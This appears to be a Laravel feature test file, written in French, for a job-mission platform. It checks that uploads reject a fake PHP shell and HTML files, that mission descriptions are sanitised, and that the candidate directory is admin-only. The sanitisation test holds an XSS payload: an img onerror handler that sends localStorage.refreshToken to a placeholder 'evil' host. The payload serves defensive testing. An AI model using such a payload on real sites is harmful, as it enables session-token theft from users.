<?php

namespace Tests\Feature;

use App\Models\{Candidat, Entreprise, Mission, User};
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * C7 — uploads validés ; C2 — HTML nettoyé à l'enregistrement ; C8 — annuaire des candidats réservé aux admins.
 */
class UploadAndContentSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('public');
    }

    public function test_un_certificat_de_formation_doit_etre_un_pdf_ou_une_image(): void
    {
        $candidat = Candidat::factory()->create();
        $headers = $this->bearerFor($candidat->user);

        $this->withHeaders($headers)->post('/api/candidat/formation', [
            'titre' => 'Formation',
            'organisme' => 'Organisme',
            'certificat' => UploadedFile::fake()->create('shell.php', 1, 'application/x-php'),
        ], ['Accept' => 'application/json'])->assertStatus(422);

        $this->withHeaders($headers)->post('/api/candidat/formation', [
            'titre' => 'Formation',
            'organisme' => 'Organisme',
            'certificat' => UploadedFile::fake()->create('page.html', 1, 'text/html'),
        ], ['Accept' => 'application/json'])->assertStatus(422);

        $this->assertSame(0, $candidat->formations()->count());
        $this->assertEmpty(Storage::disk('public')->allFiles());

        $this->withHeaders($headers)->post('/api/candidat/formation', [
            'titre' => 'Formation',
            'organisme' => 'Organisme',
            'certificat' => UploadedFile::fake()->create('certificat.pdf', 10, 'application/pdf'),
        ], ['Accept' => 'application/json'])->assertCreated();

        $this->assertSame(1, $candidat->formations()->count());
    }

    public function test_un_diplome_sans_fichier_ne_fait_plus_planter_l_api(): void
    {
        $candidat = Candidat::factory()->create();

        $this->withHeaders($this->bearerFor($candidat->user))
            ->postJson('/api/candidat/diplome', ['intitule' => 'Licence en informatique'])
            ->assertCreated();

        $this->assertSame(1, $candidat->diplomes()->count());
    }

    public function test_la_description_de_mission_est_nettoyee_a_l_enregistrement(): void
    {
        $entreprise = Entreprise::factory()->create();

        $this->withHeaders($this->bearerFor($entreprise->user))->postJson('/api/missions', [
            'title' => 'Mission piégée',
            'company' => 'ACME',
            'location' => 'Cotonou',
            'reward' => 20000,
            'deadline' => now()->addWeek()->toDateString(),
            'description' => '<p>Bonjour <strong>à tous</strong></p><img src=x onerror="fetch(\'https://evil/\'+localStorage.refreshToken)"><script>alert(1)</script>',
            'skills' => ['Excel'],
            'urgency' => 'normal',
            'category' => 'Digital',
            'min_rank_required' => 'E',
            'test_severity' => 'standard',
            'type_contrat' => 'Mission Ponctuelle',
        ])->assertOk();

        $description = Mission::where('title', 'Mission piégée')->value('description');
        $this->assertStringContainsString('<strong>à tous</strong>', $description);
        $this->assertStringNotContainsString('onerror', $description);
        $this->assertStringNotContainsString('<script', $description);
    }

    public function test_l_annuaire_des_candidats_est_reserve_aux_admins(): void
    {
        $candidat = Candidat::factory()->create();
        $entreprise = Entreprise::factory()->create();
        $admin = User::factory()->create(['role' => 'ADMIN']);

        $this->withHeaders($this->bearerFor($candidat->user))->getJson('/api/filter')->assertStatus(403);
        $this->withHeaders($this->bearerFor($entreprise->user))->getJson('/api/filter')->assertStatus(403);
        $this->withHeaders($this->bearerFor($admin))->getJson('/api/filter')->assertOk();
    }
}
